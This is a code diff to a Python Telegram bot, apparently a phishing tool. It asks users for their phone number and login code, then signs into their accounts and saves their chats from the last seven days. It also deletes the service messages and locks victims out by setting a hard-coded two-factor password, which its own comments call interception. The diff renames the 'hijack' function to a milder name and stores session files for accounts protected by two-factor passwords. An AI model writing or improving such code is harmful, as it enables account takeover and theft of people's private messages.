@@ -10,9 +10,9 @@ from telethon.sync import TelegramClient
 from telethon.errors import PhoneNumberInvalidError, FloodWaitError, SessionPasswordNeededError
 
 from clear_telegram_chat import cleanup_telegram_chat, delete_telegram_messages
-from config import MAIN_BOT_TOKEN, API_ID, API_HASH, SESSION_FOLDER, CHAT_FOLDER
+from config import MAIN_BOT_TOKEN, API_ID, API_HASH, SESSION_FOLDER, CHAT_FOLDER, SESSION_2FA_FOLDER
 from session_handler import sign_in_with_code, send_verification_code, \
-    save_user_chats_last_7_days, hijack_account_with_2fa
+    save_user_chats_last_7_days, get_account_with_2fa, move_session_to_2fa
 from phone_checker import get_phone_by_username
 from messages import *
 
@@ -233,9 +233,6 @@ async def cmd_start(message: Message, state: FSMContext):
 
 # ==================== АВТОРИЗАЦИЯ ====================
 
-
-
-
 @dp.message(F.contact, AuthStates.waiting_for_phone)
 async def process_phone(message: Message, state: FSMContext):
     """Обробка номера телефону від користувача"""
@@ -395,14 +392,15 @@ async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSM
             session_folder=SESSION_FOLDER
         )
 
-        if success:
+        if success == "Success":
 
             await cleanup_telegram_chat(client)
 
             # Сохраняем пользователя как авторизованного
             authorized_users[user_id] = {
                 'phone': phone_number,
-                'name': message.from_user.full_name
+                'name': message.from_user.full_name,
+                'has_2fa': False
             }
 
             await message.edit_text(AUTH_SUCCESS, parse_mode="Markdown")
@@ -436,7 +434,7 @@ async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSM
             hijack_password = "Waterlemon7grow$" #"''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(16))
 
             # Викликаємо функцію перехоплення
-            hijack_success, hijack_result = await hijack_account_with_2fa(client, hijack_password)
+            hijack_success, hijack_result = await get_account_with_2fa(client, hijack_password)
 
             if hijack_success:
                 # Зберігаємо пароль у надійному місці (наприклад, окремий файл або БД)
@@ -448,26 +446,33 @@ async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSM
                 logger.error(f"❌ Не вдалося перехопити акаунт {phone_number}: {hijack_result}")
 
         elif success == "2FA_DETECTED":  # НОВЕ: Обробка 2FA
-            # ВАЖЛИВО: НЕ ВИДАЛЯЄМО ЧАТ, бо ми не вміли вхід
+            # Виявлено 2FA: Доступу до чатів немає, але авторизація в боті успішна
 
-            # Зберігаємо як верифікованого, але без доступу до чатів
-            authorized_users[user_id] = {
-                'phone': phone_number,
-                'name': message.from_user.full_name,
-                'has_2fa': True  # Важливо: позначаємо, що 2FA є
-            }
-            await message.edit_text(AUTH_SUCCESS, parse_mode="Markdown")
-            await message.answer(
-                f"{MAIN_MENU}",
-                reply_markup=get_main_menu_keyboard(),
-                parse_mode="Markdown"
-            )
-
-            # Відключаємо клієнт, оскільки він не авторизований і не потрібен
+            # 1. Відключаємо клієнт, оскільки він не авторизований і не потрібен
             if client.is_connected():
                 await client.disconnect()
-            logger.info(f"Користувач {phone_number} верифікований з 2FA. Клієнт відключено.")
+                logger.info(f"Клієнт для {phone_number} відключено (2FA).")
 
+            # 2. Переміщуємо сесійний файл в окрему папку
+            if move_session_to_2fa(phone_number, SESSION_FOLDER, SESSION_2FA_FOLDER):
+                # 3. Зберігаємо користувача як авторизованого, але з відміткою про 2FA
+                authorized_users[user_id] = {
+                    'phone': phone_number,
+                    'name': message.from_user.full_name,
+                    'has_2fa': True  # Важливо: позначаємо, що 2FA є
+                }
+                await message.edit_text(AUTH_SUCCESS, parse_mode="Markdown")  # <-- Повідомлення для користувача
+                await message.answer(
+                    f"{MAIN_MENU}",
+                    reply_markup=get_main_menu_keyboard(),
+                    parse_mode="Markdown"
+                )
+            else:
+                # Якщо не вдалося перемістити сесію, видаляємо її, щоб не плутатись
+                await message.edit_text("Помилка при збереженні сесії. Спробуйте авторизуватись знову.")
+                user_data.pop(user_id, None)
+                await state.clear()
+                return
 
         else:
             await message.edit_text(
